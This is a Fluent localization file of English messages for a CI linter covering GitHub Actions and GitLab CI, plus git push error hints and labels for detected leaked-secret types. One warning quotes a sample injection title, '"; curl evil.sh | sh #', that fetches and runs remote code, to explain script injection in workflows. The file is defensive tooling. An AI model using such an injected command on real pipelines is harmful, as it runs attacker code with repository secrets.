# Семантические ключи Fluent. Сообщения классификатора git совпадают со словарём 1.x (проверяется тестом).

error-protected = The branch is protected on the server — direct push is forbidden
error-protected-hint = Create a separate branch and open a Pull Request, or ask an admin to change the protection rules.

error-hook-declined = The server rejected the push (server hook)
error-hook-declined-hint = See the details: the server usually gives the reason in lines starting with "remote:".

error-forbidden = No write access to this repository
error-forbidden-hint = Your account or token has read-only access. Ask the repository owner for Write access or use a token with the "repo" scope.

error-host-key = SSH: the server key isn't confirmed
error-host-key-hint = Connect once from a terminal (for example, "ssh -T git@github.com") and confirm the server fingerprint.

error-auth = Authorization error on the server
error-auth-hint = Enter a username and password, an access token, or choose an SSH key in the "Repository sign-in" window — the app will remember them for this repository. For HTTPS, the Git Credential Manager window also works; for SSH — a key added to your account on the server.

error-not-found = The repository wasn't found or there's no access to it
error-not-found-hint = Check the remote URL. For private repositories the server answers "not found" if the account has no access.

error-rejected-non-ff = The remote branch has commits you don't have
error-rejected-non-ff-hint = Pull first, or Force Push (with lease) if you're sure you want to overwrite the remote.

error-diverged = The branches have diverged — fast-forward is impossible
error-diverged-hint = Use Pull (fast-forward if possible) or Pull (rebase).

error-conflict = Merge conflicts occurred
error-conflict-hint = Resolve the conflicts in the marked files, then stage them and commit.

error-dirty = Local changes are in the way of the operation
error-dirty-hint = Commit the changes or Stash them, then retry.

error-network = Couldn't connect to the server
error-network-hint = Check your internet connection, VPN or proxy.

# Сообщения Rust (crates/*/src). { $a0 }, { $a1 }… — аргументы t()/tr!() по порядку.

## crates/gorynych-ci-linter/src/check/base.rs

perhaps-you-meant = {" "}Perhaps you meant { $a0 }.
must-be-followed-by-variable = $ must be followed by a variable name (position { $a0 })
unclosed-quote-position = unclosed quote { $a0 } (position { $a1 })
unclosed-regex-position = unclosed regex /…/ (position { $a0 })
invalid-regex = invalid regex /{ $a0 }/: { $a1 }
single-position-comparison-needs = single "=" (position { $a0 }) — comparison needs "=="
without-quotes-position-strings-in = { $a0 } without quotes (position { $a1 }) — strings in expressions are written in quotes: "{ $a2 }"
unexpected-character-position = unexpected character { $a0 } (position { $a1 })
empty-expression = empty expression
extra-text-after-expression-missing = extra text after the expression: { $a0 } — missing && or ||?
expression-is-cut-off = the expression is cut off
unclosed-parenthesis = unclosed parenthesis (
expected-value-but-found = expected a value, but found { $a0 }
quoted-string = a quoted string
value = value
right-side-of-must-be = the right side of { $a0 } must be a regex /…/, not { $a1 }
gitlab-token-glpat = GitLab token (glpat-…)
github-token-ghp = GitHub token (ghp_…)
github-token-github-pat = GitHub token (github_pat_…)
aws-access-key-akia = AWS access key (AKIA…)
slack-token = Slack token
private-key = private key
google-api-key = Google API key
stripe-secret-key = Stripe secret key

## crates/gorynych-ci-linter/src/check/github.rs

september-2021 = September 2021
april-2023 = April 2023
april-2025 = April 2025
august-2022 = August 2022
june-2024 = June 2024
december-2024 = December 2024
december-2025 = December 2025
march-2022 = March 2022
june-2025 = June 2025
job-will-fail-right-away = The job will fail right away: "This request has been automatically failed because it uses a deprecated version of `actions/upload-artifact: v3`".
job-will-fail-right-away-this = The job will fail right away: "This request has been automatically failed because it uses a deprecated version of `actions/download-artifact: v3`".
job-will-fail-since-february = The job will fail: since February 2025 old actions/cache versions are disabled (cache service v1 is turned off).
works-with-warning-node-js = Works with the warning "Node.js 16/20 actions are deprecated" and may stop running when GitHub disables the old Node.js.
works-with-deprecated-node-js = Works with a deprecated Node.js warning; may stop running later.
works-with-deprecated-node-js-warning = Works with a deprecated Node.js warning.
github-wont-run-workflow-invalid = GitHub won't run the workflow: "Invalid workflow file … { $a0 }". The Actions tab will show a red error with this text.
n-5-fields-are-needed = 5 fields are needed (minute hour day month weekday), but there are { $a0 }
minutes = minutes
hours = hours
day-of-month = day of month
month = month
day-of-week = day of week
field-unrecognized-value = field "{ $a0 }": unrecognized value { $a1 }
field-is-out-of-range = field "{ $a0 }": { $a1 } is out of range { $a2 }–{ $a3 }
field-step-0 = field "{ $a0 }": step /0
as-string-only-read-all = As a string, only read-all or write-all can be given.
on-every-run = On every run
github-token-will-get-write = The GITHUB_TOKEN will get write access to everything — if some step (a third-party action) is compromised, it can change code and releases.
broad-permissions-without-need = Broad permissions without need.
list-only-needed-permissions-contents = List only the needed permissions: contents: read, pull-requests: write…
permissions-unknown-permission = permissions: unknown permission { $a0 }
permissions = Permissions: { $a0 }.{ $a1 }
fix-permission-name = Fix the permission name.
id-token-allows-only-write = id-token allows only write or none.
value-is-read-write-or = The value is read, write or none.
move-secret-to-env-and = Move the secret to env and check env.MY_SECRET != ''
at-step-level = {" "}at the step level
secrets-in-if-condition = { $a0 }: secrets in an if condition
secrets-context-isnt-available-in = The secrets context isn't available in if (so the condition can't reveal the secret).
condition-is-always-true = { $a0 }: condition { $a1 } is always true
step-job-will-always-run = The step/job will always run: text follows ${"{"}{"{"} … {"}"}{"}"}, and the whole expression becomes a non-empty string.
if-doesnt-cover-whole-condition = If ${"{"}{"{"} {"}"}{"}"} doesn't cover the whole condition, GitHub substitutes the result into a string, and a non-empty string is true.
remove-or-wrap-whole-condition = Remove ${"{"}{"{"} {"}"}{"}"} or wrap the whole condition in it: if: ${"{"}{"{"} { $a0 } { $a1 } {"}"}{"}"}
right-on-push-github-checks = Right on push — GitHub checks the workflow file before running
unknown-section = Unknown section { $a0 }
allowed-at-top-level = Allowed at the top level: { $a0 }.{ $a1 }
fix-or-delete-section = Fix or delete the section.
when-to-run-isnt-specified = When to run isn't specified (on)
without-on-github-doesnt-know = Without on, GitHub doesn't know which events to react to.
no-jobs-section = No jobs section
workflow-without-jobs-does-nothing = A workflow without jobs does nothing.
unknown-event = Unknown event { $a0 }
github-doesnt-know-this-event = GitHub doesn't know this event.{ $a0 }
fix-event-name = Fix the event name.
unknown-filter = { $a0 }: unknown filter { $a1 }
allowed = Allowed: { $a0 }.{ $a1 }
fix-key = Fix the key.
and-together = { $a0 }: { $a1 } and { $a2 } together
you-cant-include-and-exclude = You can't include and exclude in the same event at once.
keep-and-add-exclusions-with = Keep { $a0 } and add exclusions with "!": - '!release/**'
more-than-25-inputs = { $a0 }: more than 25 inputs
github-limit = A GitHub limit.
combine-inputs-for-example-json = Combine the inputs (for example, JSON in a single string).
input-type = Input { $a0 }: type { $a1 }
allowed-types = Allowed types: { $a0 }.{ $a1 }
input-choice-without-options = Input { $a0 }: choice without options
picking-from-list-needs-list = Picking from a list needs the list itself.
input-default-isnt-in-options = Input { $a0 }: default isn't in options
set-default-to-value-from = Set default to a value from the list.
input-default-for-boolean = Input { $a0 }: default { $a1 } for boolean
default-value-will-be-treated = The default value will be treated as a string; the comparison inputs.x == true may not work.
boolean-expects-true-false-without = A boolean expects true/false without quotes.
schedule-without-cron = schedule without cron
schedule-is-required = A schedule is required.
schedule-entry-without-cron = schedule: entry without cron
each-schedule-entry-is-cron = Each schedule entry is {"{"} cron: "…" {"}"}.
invalid-schedule = Invalid schedule { $a0 }
for-example-30-2-1 = For example '30 2 * * 1-5' — weekdays at 02:30 UTC.
schedule-more-often-than-every = Schedule { $a0 } — more often than every 5 minutes
on-schedule = On schedule
github-will-still-run-it = GitHub will still run it no more often than every 5 minutes, and during peak hours with delays or skips.
minimum-schedule-interval-in-actions = The minimum schedule interval in Actions is 5 minutes.
use-5-or-less-often = Use '*/5 * * * *' or less often.
schedule-in-utc = Schedule { $a0 } — in UTC
it-will-run-on-utc = It will run on UTC time, not your time zone; in inactive repositories (60 days without commits) schedules are disabled.
thats-how-schedules-work-in = That's how schedules work in GitHub Actions.
convert-time-to-utc-moscow = Convert the time to UTC (Moscow = UTC+3).
unclosed-expression = Unclosed expression ${"{"}{"{"} … {"}"}{"}"}
has-no-closing = { $a0 } has no closing "{"}"}{"}"}".
add = Add "{"}"}{"}"}".
invalid-job-id = Invalid job id { $a0 }
job-id-is-latin-letters = A job id is Latin letters, digits, "_" and "-", starting with a letter or "_".
rename-it-to-set-human = Rename it to { $a0 }; set a human-readable name with name:.
job-must-be-map = { $a0 }: a job must be a map
job-is-described-by-keys = A job is described by the keys runs-on, steps…
commands-are-written-in-steps = {" "}Commands are written in steps: - run: …
unknown-key = { $a0 }: unknown key { $a1 }
allowed-2 = Allowed: { $a0 }.{ $a1 }{ $a2 }
needs-on-unknown = { $a0 }: needs on an unknown { $a1 }
theres-no-job-with-id = There's no job with id { $a0 } (needs refers to the id, not the name).{ $a1 }
fix-id = Fix the id.
uses-together-with-runs-on = { $a0 }: uses together with runs-on/steps
job-that-calls-reusable-workflow = A job that calls a reusable workflow (uses) can't have its own steps.
keep-uses-with-secrets-or = Keep uses + with/secrets or runs-on + steps.
no-file = { $a0 }: no file { $a1 }
file-isnt-in-repository = The file isn't in the repository.
check-path-github-workflows-yml = Check the path (.github/workflows/…yml).
uses-without-version = { $a0 }: uses without @version
workflow-from-another-repository-needs = A workflow from another repository needs a version: owner/repo/.github/workflows/x.yml@v1.
runs-on-isnt-specified = { $a0 }: runs-on isn't specified
job-must-know-which-machine = A job must know which machine to run on.
when-job-runs = When job { $a0 } runs
when-job-runs-2 = When job { $a0 } runs
runner-no-longer-exists = { $a0 }: runner { $a1 } no longer exists
job-wont-start-this-request = The job won't start: "This request was automatically failed because there were no enabled runners online to process the request…" (image { $a0 } disabled — { $a1 }).
github-removes-old-runner-images = GitHub removes old runner images.
runs-on-or-latest = runs-on: { $a0 } (or { $a1 }-latest)
container-on = { $a0 }: container on { $a1 }
job-will-fail-on-first = The job will fail on the first step: "Container operations are only supported on Linux runners".
containers-in-actions-work-only = Containers in Actions work only on Linux.
timeout-minutes-more-than-6 = { $a0 }: timeout-minutes { $a1 } — more than 6 hours
on-github-runners-job-will = On GitHub runners the job will be stopped after 6 hours anyway.
github-hosted-runner-limit-is = The GitHub-hosted runner limit is 360 minutes.
split-work-into-parts-or = Split the work into parts or use your own runner.
matrix-produces-jobs = { $a0 }: the matrix produces { $a1 } jobs
at-most-256-combinations = At most 256 combinations.
reduce-matrix-values = Reduce the matrix values.
no-steps = { $a0 }: no steps
job-has-nothing-to-run = The job has nothing to run.
steps-is-empty-or-not = { $a0 }: steps is empty or not a list
steps-is-list-of-steps = steps is a list of steps, each starting with "- ".
job = job { $a0 }
step = step { $a0 }
isnt-map = { $a0 }: { $a1 } isn't a map
step-is-set-of-keys = A step is a set of keys (uses / run / name…).
unknown-key-2 = { $a0 }: { $a1 } — unknown key { $a2 }
has-both-uses-and-run = { $a0 }: { $a1 } has both uses and run
step-either-calls-action-or = A step either calls an action or runs commands.
split-it-into-two-steps = Split it into two steps.
has-neither-uses-nor-run = { $a0 }: { $a1 } has neither uses nor run
step-has-nothing-to-do = The step has nothing to do.
pull-request-target-checkout-of = { $a0 }: pull_request_target + checkout of PR code
on-pull-request-from-fork = On a pull request from a fork
code-from-someone-elses-pr = Code from someone else's PR will run with access to secrets and a write token — the classic "pwn request" attack.
pull-request-target-runs-in = pull_request_target runs in the context of the base repository (with secrets), and checkout takes the unverified PR code.
use-pull-request-or-dont = Use pull_request, or don't run PR code in this workflow.
local-action-before-checkout = { $a0 }: local action { $a1 } before checkout
step-will-fail-cant-find = The step will fail: "Can't find 'action.yml', 'action.yaml' or 'Dockerfile' under '…/{ $a0 }'. Did you forget to run actions/checkout before running your local action?"
repository-files-appear-on-runner = Repository files appear on the runner only after actions/checkout.
put-uses-actions-checkout-v5 = Put - uses: actions/checkout@v5 before this step.
no-action = { $a0 }: no action { $a1 }
step-will-fail-cant-find-action = The step will fail: "Can't find 'action.yml', 'action.yaml' or 'Dockerfile' under '…/{ $a0 }'".
has-no-action-yml = { $a0 } has no action.yml.
check-path = Check the path.
without-version = { $a0 }: { $a1 } without @version
action-from-another-repository-needs = An action from another repository needs a version (tag, branch or SHA).
v1-better-full-commit-sha = { $a0 }@v1 (better — the full commit SHA)
is-deprecated = { $a0 }: { $a1 } is deprecated
versions-of-before-are-disabled = Versions of { $a0 } before { $a1 } are disabled or deprecated.
by-branch = { $a0 }: { $a1 } — by branch
action-can-change-at-any = The action can change at any moment — and break the build or run someone else's code with your secrets.
branch-reference-to-third-party = A branch reference to a third-party repository doesn't pin the version.
specify-tag-or-full-commit = Specify a tag or the full commit SHA.
set-output-is-deprecated = { $a0 }: { $a1 } — ::set-output is deprecated
it-now-shows-warning-set = It now shows the warning "The `set-output` command is deprecated"; once disabled, the value won't get into outputs.
set-output-save-state-commands = The ::set-output / ::save-state commands were replaced by environment files.
set-env-add-path-are = { $a0 }: { $a1 } — ::set-env / ::add-path are disabled
step-will-fail-set-env = The step will fail: "The `set-env` command is disabled. Please upgrade to using Environment Files".
commands-were-disabled-for-security = The commands were disabled for security reasons.
right-in-command = { $a0 }: { $a1 } — { $a2 } right in the command
when-issue-pr-author-is = When the issue/PR author is an outsider
text-from-title-description-is = Text from the title/description is inserted into the script as is: a title like '"; curl evil.sh | sh #' will run on the runner.
expressions-are-substituted-before-shell = ${"{"}{"{"} {"}"}{"}"} expressions are substituted before the shell starts, without escaping.
step-2 = step { $a0 }{ $a1 }
steps-no-step-with-this = { $a0 }: steps.{ $a1 } — no step with this id
expression-will-give-empty-string = The expression will give an empty string — the condition or parameter won't be what you expect.
job-has-no-step-with = The job has no step with id: { $a0 }.{ $a1 }
add-id-to-right-step = Add id: { $a0 } to the right step.
job-has-no-strategy-matrix = The job has no strategy.matrix.
matrix-has = The matrix has: { $a0 }.
matrix-no-such-dimension = { $a0 }: matrix.{ $a1 } — no such dimension
empty-string-will-be-substituted = An empty string will be substituted.
fix-name-or-add-it = Fix the name or add it to the matrix.
needs-outputs-without-needs = { $a0 }: needs.{ $a1 }.outputs without needs: { $a2 }
value-will-be-empty-jobs = The value will be empty: a job's results are available only to the jobs that wait for it.
isnt-listed-in-needs-of = { $a0 } isn't listed in needs of job { $a1 }.
has-no-output = { $a0 }: { $a1 } has no output { $a2 }
outputs-of-job = outputs of job { $a0 }: { $a1 }.
fix-name-or-declare-output = Fix the name or declare the output.
no-actions-checkout-before = { $a0 }: no actions/checkout before { $a1 }
command-will-fail-clean-runner = The command will fail: a clean runner has no repository files — "No such file or directory", "npm ERR! enoent Could not read package.json".
repository-code-appears-on-runner = Repository code appears on the runner only after the actions/checkout step.
as-first-step-uses-actions =
    As the first step:
    - uses: actions/checkout@v5
step-of-job-has-in = A step of job { $a0 } has { $a1 } in plain text
right-now-file-is-in = Right now — the file is in Git history
everyone-with-access-to-repository = Everyone with access to the repository will see the key.
secrets-must-be-stored-in = Secrets must be stored in Settings → Secrets.
revoke-key-and-use-secrets = Revoke the key and use ${"{"}{"{"} secrets.NAME {"}"}{"}"}.
jobs-wait-for-each-other = Jobs wait for each other in a circle: { $a0 }
none-of-jobs-can-start = None of the jobs can start first.
remove-one-of-dependencies = Remove one of the dependencies.

## crates/gorynych-ci-linter/src/check/gitlab/catalog.rs

coverage-report-coverage-format = coverage_report: {"{"} coverage_format: cobertura, path: … {"}"} (cobertura removed in GitLab 15.0)
browser-performance-performance-removed = browser_performance (performance removed in GitLab 15.0)
cyclonedx-license-scanning-removed-in = cyclonedx / license scanning (removed in GitLab 16.0)

## crates/gorynych-ci-linter/src/check/gitlab/extends.rs

extends-must-be-name-or = { $a0 }: extends must be a name or a list of names
extends-names-template-jobs = extends names template jobs.
extends-template-or-extends-b = extends: .template or extends: [.a, .b]
it-may-be-in-network = {" "}(It may be in a network include — then all is fine.)
extends-refers-to-nonexistent = { $a0 }: extends refers to a nonexistent { $a1 }
job-or-template-isnt-in = Job or template { $a0 } isn't in this file or in included local files.{ $a1 }{ $a2 }
fix-name-or-add-template = Fix the name or add the template.
circular-inheritance = Circular inheritance: { $a0 }
jobs-inherit-from-each-other = Jobs inherit from each other in a circle — the final configuration can't be built.
break-cycle-move-shared-part = Break the cycle: move the shared part into a separate template.
inheritance-too-deep = { $a0 }: inheritance too deep ({ $a1 })
gitlab-allows-at-most-11 = GitLab allows at most 11 levels of extends.
simplify-template-chain = Simplify the template chain.
has-no-key = { $a0 } has no key { $a1 }.
theres-no-job = There's no job { $a0 }.{ $a1 }
reference-doesnt-exist = !reference [{ $a0 }] doesn't exist
fix-job-key-name-in = Fix the job/key name in !reference.
template-isnt-used-anywhere = Template { $a0 } isn't used anywhere
nothing-will-break-it-just = Nothing will break — it just doesn't take part in the pipeline.
no-job-inherits-it-via = No job inherits it via extends or refers to it via !reference.
delete-template-or-use-it = Delete the template or use it via extends.
stage-declared-twice = Stage declared twice: { $a0 }
gitlab-keeps-only-first-mention = GitLab keeps only the first mention; the stage order may not be what you expect.
each-stage-must-appear-in = Each stage must appear in stages once.
remove-repeat = Remove the repeat.
pre-and-post-dont-need = {"."}pre and .post don't need to be listed in stages
nothing-will-break-these-stages = Nothing will break: these stages always exist and always come first and last.
their-position-is-fixed-listed = Their position is fixed; the listed order is ignored.
remove-pre-post-from-stages = Remove .pre / .post from stages.

## crates/gorynych-ci-linter/src/check/gitlab/jobs.rs

job-name-too-long = Job name too long
job-name-is-limited-to = A job name is limited to 255 characters.
shorten-name = Shorten the name.
typo-in = {" "}— a typo in { $a0 }?
gitlab-doesnt-know-key-closest = GitLab doesn't know the key { $a0 }; the closest valid one is { $a1 }.
gitlab-checks-all-job-keys = GitLab checks all job keys; { $a0 } isn't one of them.{ $a1 }
key-came-from-template-in = {" "}The key came from a template in extends.
rename-to = Rename { $a0 } to { $a1 }.
remove-key-or-move-data = Remove the key or move the data to variables.
unknown-key-3 = { $a0 }: unknown key { $a1 }{ $a2 }
typo-in-2 = { $a0 } — a typo in { $a1 }?
no-script = { $a0 }: no script
section-isnt-reserved-so-gitlab = Section { $a0 } isn't reserved, so GitLab treats it as a job, and the job has no script.
job-has-no-commands-to = The job has no commands to run{ $a0 }.
and-templates-in-extends-dont = {" "}— and the templates in extends don't add any
rename-to-2 = Rename to { $a0 }.
add-script-for-example-script =
    Add a script, for example:
    { $a0 }:
    {"  "}script:
    {"    "}- echo "…"
trigger-and-script-together = { $a0 }: trigger and script together
job-with-trigger-doesnt-run = A job with trigger doesn't run anything itself — it starts another pipeline.
split-it-into-two-jobs = Split it into two jobs: one with script, the other with trigger.
empty-script = { $a0 }: empty script
script-must-have-at-least = script must have at least one command.
add-command-or-delete-job = Add a command or delete the job.
line-was-read-as-key = { $a0 }: line { $a1 } was read as "key: value"
line-contains-yaml-treats-it = Line { $a0 } contains ": " — YAML treats it as a map, not a command.
quote-line = Quote the line: - '{ $a0 }: { $a1 }'
in-value-is = { $a0 }: in { $a1 } the value is { $a2 }
command-will-run-most-likely = The command { $a0 } will run — most likely "command not found".
yaml-read-string-as-number = YAML read the string as a number/boolean.
check-string-and-quote-it = Check the string and quote it.
stage-must-be-string = { $a0 }: stage must be a string
job-belongs-to-one-stage = A job belongs to one stage.
stages-isnt-declared-so-only = stages isn't declared, so only build, test, deploy (+ .pre, .post) are available.{ $a0 }
perhaps = {" "}Perhaps { $a0 }.
declared-stages = Declared stages: { $a0 }.{ $a1 }
change-it-to-stage-or = Change it to stage: { $a0 } or add { $a1 } to stages.
add-to-stages = Add { $a0 } to stages.
stage-isnt-in-stages = { $a0 }: stage { $a1 } isn't in stages
unknown-value = Unknown value.{ $a0 }
use-one-of = Use one of: { $a0 }.
when-never-job-will-never = { $a0 }: when: never — the job will never run
job-wont-be-in-any = The job won't be in any pipeline.
when-never-at-job-level = when: never at the job level turns it off completely (never is usually written inside rules).
delete-job-or-move-condition = Delete the job or move the condition to rules.
when-delayed-without-start-in = { $a0 }: when: delayed without start_in
delayed-job-needs-to-know = A delayed job needs to know when to start.
start-in-without-when-delayed = { $a0 }: start_in without when: delayed
start-in-only-makes-sense = start_in only makes sense for delayed jobs.
add-when-delayed-or-remove = Add when: delayed or remove start_in.
cant-parse-start-in = { $a0 }: can't parse start_in: { $a1 }
duration-is-written-as-30 = The duration is written as "30 minutes", "1 hour", "2 days".
start-in-is-longer-than = { $a0 }: start_in is longer than a week
maximum-delay-is-1-week = The maximum delay is 1 week.
reduce-start-in-or-use = Reduce start_in or use a schedule.
came-from-template = {" "}({ $a0 } came from a template)
rules-together-with = { $a0 }: rules together with { $a1 }
rules-replaces-they-cant-be = rules replaces { $a0 }; they can't be used together{ $a1 }.
move-condition-from-to-rules = Move the condition from { $a0 } to rules.
more-than-50-needs = { $a0 }: more than 50 needs
gitlab-limit = A GitLab limit.
shorten-list-or-merge-jobs = Shorten the list or merge jobs.
dependencies-on-nonexistent = { $a0 }: dependencies on a nonexistent { $a1 }
fix-name = Fix the name.
in-dependencies-but-not-in = { $a0 }: { $a1 } in dependencies but not in needs
when-needs-is-set-dependencies = When needs is set, dependencies can only refer to jobs from needs.
add-to-needs = Add { $a0 } to needs.
isnt-from-previous-stage = { $a0 }: { $a1 } isn't from a previous stage
artifacts-can-only-be-taken = Artifacts can only be taken from jobs in previous stages, and { $a0 } is in stage { $a1 }.
move-job-or-use-needs = Move the job or use needs.
service-has-no-name = { $a0 }: the service has no name
service-is-docker-image = A service is a Docker image.
service = service
invalid-service-alias = { $a0 }: invalid service alias { $a1 }
job-will-fail-when-starting = The job will fail when starting the service: the host name is invalid.
alias-becomes-host-name-only = alias becomes the host name: only letters, digits, dots, hyphens.
for-example-alias-db = For example alias: db
needs-entry-without-job = { $a0 }: needs entry without job
each-needs-entry-is-job = Each needs entry is a job name or {"{"} job: name {"}"}.
depends-on-itself = { $a0 } depends on itself
job-cant-wait-for-itself = A job can't wait for itself to finish.
remove-job-itself-from-needs = Remove the job itself from needs.
is-hidden-job-template-it = { $a0 } is a hidden job (template); it doesn't run and can't be in needs.
needs-on-nonexistent = { $a0 }: needs on a nonexistent { $a1 }
fix-name-or-add-optional = Fix the name or add optional: true.
waits-for-from-later-stage = { $a0 } waits for { $a1 } from a later stage
is-in-stage-which-comes = { $a0 } is in stage { $a1 }, which comes after { $a2 }.
move-to-stage-no-earlier = Move { $a0 } to a stage no earlier than { $a1 }, or { $a2 } earlier.
needs-unknown-key = { $a0 }: needs — unknown key { $a1 }
allowed-job-artifacts-optional-pipeline = Allowed: job, artifacts, optional, pipeline, project, ref, parallel.{ $a0 }
remove-key = Remove the key.
parallel-is-integer-from-1 = parallel is an integer from 1 to 200.
parallel-matrix-entry-isnt-map = { $a0 }: a parallel:matrix entry isn't a map
each-matrix-entry-is-set = Each matrix entry is a set of "VARIABLE: [values]".
nested-structure-in-matrix = { $a0 }: nested structure in matrix { $a1 }
matrix-values-are-strings-or = Matrix values are strings or numbers.
list-values-as-list-of = List the values as a list of strings.
at-most-200-combinations-per = At most 200 combinations per job.
reduce-number-of-values = Reduce the number of values.
unrecognized-parallel = { $a0 }: unrecognized parallel
parallel-is-number-or-matrix = parallel is a number or {"{"} matrix: [...] {"}"}.
gitlab-retries-job-at-most = GitLab retries a job at most 2 times.
unknown-retry-reason = Unknown retry reason.{ $a0 }
allowed-3 = Allowed: { $a0 }…
retry-unknown-key = { $a0 }: retry — unknown key { $a1 }
allowed-max-when-exit-codes = Allowed: max, when, exit_codes.
cant-parse-timeout = { $a0 }: can't parse timeout: { $a1 }
duration-is-written-as-1h = The duration is written as "1h 30m", "90 minutes".
timeout-longer-than-month = { $a0 }: timeout longer than a month
maximum-is-1-month = The maximum is 1 month.
reduce-timeout = Reduce the timeout.
allow-failure-is-true-false = allow_failure is true/false or {"{"} exit_codes: [codes] {"}"}.
coverage-isnt-regular-expression = { $a0 }: coverage isn't a regular expression
coverage-is-written-between-slashes = coverage is written between slashes.
error-in-coverage-regex = { $a0 }: error in the coverage regex
fix-expression = Fix the expression.
interruptible-must-be-true-false = { $a0 }: interruptible must be true/false
currently = Currently: { $a0 }.
tags-must-be-list-of = { $a0 }: tags must be a list of strings
tags-are-given-as-list = Tags are given as a list.
inherit-unknown-key = { $a0 }: inherit — unknown key { $a1 }
allowed-default-and-variables = Allowed: default and variables.
inherit-must-be-map = { $a0 }: inherit must be a map
trigger-with-both-project-and = { $a0 }: trigger with both project and include
either-child-pipeline-include-or = Either a child pipeline (include) or another project's pipeline (project).
keep-one = Keep one.
allowed-depend-and-mirror = Allowed: depend and mirror.
child-pipeline-not-found = { $a0 }: child pipeline { $a1 } not found
when-job-gets-its-turn = When job { $a0 } gets its turn
child-pipeline-wont-be-created = The child pipeline won't be created and job { $a0 } will fail: "Included file `{ $a1 }` is empty or does not exist!".
check-path-from-repository-root = Check the path from the repository root.
folder-isnt-in-artifacts = { $a0 }: folder { $a1 } isn't in the artifacts
after-job = After job { $a0 }
site-wont-be-published-pages = The site won't be published: the pages:deploy job will fail — "pages:deploy … The { $a0 } folder is missing from the artifacts".
gitlab-pages-publishes-contents-of = GitLab Pages publishes the contents of folder { $a0 } from the job's artifacts.
release-without-tag-name = { $a0 }: release without tag_name
release-is-tied-to-tag = A release is tied to a tag.
release-without-description = { $a0 }: release without description
release-description-is-required = A release description is required.
description-release-ci-commit-tag = description: "Release $CI_COMMIT_TAG"
release-in-image-without-release = { $a0 }: release in an image without release-cli
job-will-fail-release-cli = The job will fail: "release-cli: command not found" (or "glab: not found").
release-key-is-run-by = The release key is run by the release-cli / glab tool, which isn't in regular images.
stage-is-declared-but-has = Stage { $a0 } is declared but has no jobs
nothing-will-break-empty-stage = Nothing will break — an empty stage just isn't shown.
no-job-specifies-stage = No job specifies stage:{" "}
remove-stage-or-check-jobs = Remove the stage or check the jobs' stage (typo?).
only-except-are-deprecated-set = only/except are deprecated ({ $a0 } set.)
it-works-for-now-but = It works for now, but new features (needs, variables, changes:compare_to in rules) are only available through rules.
only-except-are-no-longer = only/except are no longer developed. Used in: { $a0 }{ $a1 }.
for-example-only-main-rules =
    For example, only: [main] →
    rules:
    {"  "}- if: $CI_COMMIT_BRANCH == "main"
needs-runner-with-tags = Needs a runner with tags: { $a0 }
when-jobs-run = When jobs { $a0 }{ $a1 } run
if-theres-no-such-runner = If there's no such runner, the job will hang in pending: "This job is stuck because you don’t have any active runners online … with any of these tags assigned to them".
job-is-picked-up-only = A job is picked up only by a runner that has every listed tag.
check-settings-ci-cd-runners = Check Settings → CI/CD → Runners.
docker-dind-requires-privileged-runner = docker:dind requires a privileged runner
on-runner-without-privileged-true = On a runner without privileged = true the service won't start: "mount: permission denied" / "Cannot connect to the Docker daemon".
docker-in-docker-runs-its = Docker-in-Docker runs its own daemon inside the container, and that must be allowed in the runner settings.
check-that-runner-has-privileged = Check that the runner has privileged = true (config.toml), or use kaniko/buildah.
none-of-jobs-can-start-first = None of the jobs can start first.

## crates/gorynych-ci-linter/src/check/gitlab/mod.rs

right-on-push-gitlab-checks = Right on push — GitLab checks the whole file before creating a pipeline
gitlab-wont-create-pipeline-and = GitLab won't create the pipeline and will show an error: "{ $a0 }". No jobs will run.
at-top-level = at the top level
in = in { $a0 }
there-will-be-no-error = There will be no error: YAML silently takes the last value, and the first one (line{" "}
is-lost-entirely = ) is lost entirely.
key-is-repeated = Key { $a0 } is repeated { $a1 }
key-may-appear-only-once = A key may appear only once in a YAML block; a repeat is usually a copy-paste result.
remove-extra-block-or-merge = Remove the extra block or merge them into one.
unknown-section-looks-like = Unknown section { $a0 } — looks like { $a1 }
job-must-be-set-of = { $a0 }: a job must be a set of keys
anything-that-isnt-reserved-section = Anything that isn't a reserved section ({ $a0 } etc.) is a job to GitLab, and a job can't be { $a1 }.
list = a list
string = a string
at-top-level-all-keys = At the top level, all keys except reserved ones (stages, variables, default…) are jobs; a job is described by a map with script/stage, etc.
write-it-as-job-script =
    Write it as a job:
    { $a0 }:
    {"  "}script:
    {"    "}- { $a1 }
configuration-has-no-jobs = The configuration has no jobs
file-has-only-reserved-sections = The file has only reserved sections.
there-are-only-hidden-jobs = There are only hidden jobs (names starting with a dot) — they serve as templates and don't run on their own.
add-job-whose-name-doesnt =
    Add a job whose name doesn't start with a dot, for example:
    build:
    {"  "}script:
    {"    "}- echo "ok"
stages-must-be-list = stages must be a list
stages-are-listed-in-order = Stages are listed in the order they run.
types-section-is-deprecated = The types section is deprecated
in-newer-gitlab-versions-17 = In newer GitLab versions (17.0+) the key is removed — the file will stop passing validation.
types-is-old-name-of = types is the old name of stages.
rename-types-to-stages = Rename types to stages.
variables-must-be-set-of = variables must be a set of "NAME: value"
variables-are-given-as-map = Variables are given as a map, not a list.
global-is-deprecated-use-default = Global { $a0 } is deprecated — use default:
it-works-for-now-but-gitlab = It works for now, but GitLab marked this entry as deprecated and may remove it.
top-level-job-keys-were = Top-level job keys ({ $a0 }) were replaced by the default section.
is-set-in-each-job = {" "}{ $a0 } is set in each job (variables — at the top level).
default-unknown-key = default: unknown key { $a0 }
only-these-are-allowed-in = Only these are allowed in default: { $a0 }.{ $a1 }{ $a2 }
remove-key-from-default-or = Remove the key from default or move it to the jobs.
include-path-with-variable = include { $a0 }: path with a variable
file-cant-be-checked-in = The file can't be checked in advance: it's determined by a variable when the pipeline is created.
only-some-variables-are-allowed = Only some variables are allowed in include (project, group, predefined).
make-sure-file-exists-for = Make sure the file exists for every value of the variable.
include-not-yaml-file = include { $a0 }: not a YAML file
only-yml-yaml-files-can = Only .yml / .yaml files can be included.
rename-file-to-yml-or = Rename the file to .yml or specify the right one.
not-found = not found
no-file-matches-pattern = ; no file matches the pattern
include-file-isnt-in-repository = include { $a0 }: the file isn't in the repository
file-is-looked-up-from = The file is looked up from the repository root in the same branch/commit{ $a0 }.
check-path-from-root-letter = Check the path (from the root, letter case) and that the file is committed.
gitlab-limits-nesting-of-includes = GitLab limits the nesting of includes.
shorten-include-chain = Shorten the include chain.
include-over-insecure-http = include { $a0 }: over insecure http
file-can-be-tampered-with = The file can be tampered with in transit — and the tampered jobs will run with your variables and tokens.
remote-files-are-downloaded-every = remote files are downloaded every time a pipeline is created.
use-https-or-keep-file = Use https:// or keep the file in the repository (include: local / project).
include-unrecognized-entry = include: unrecognized entry
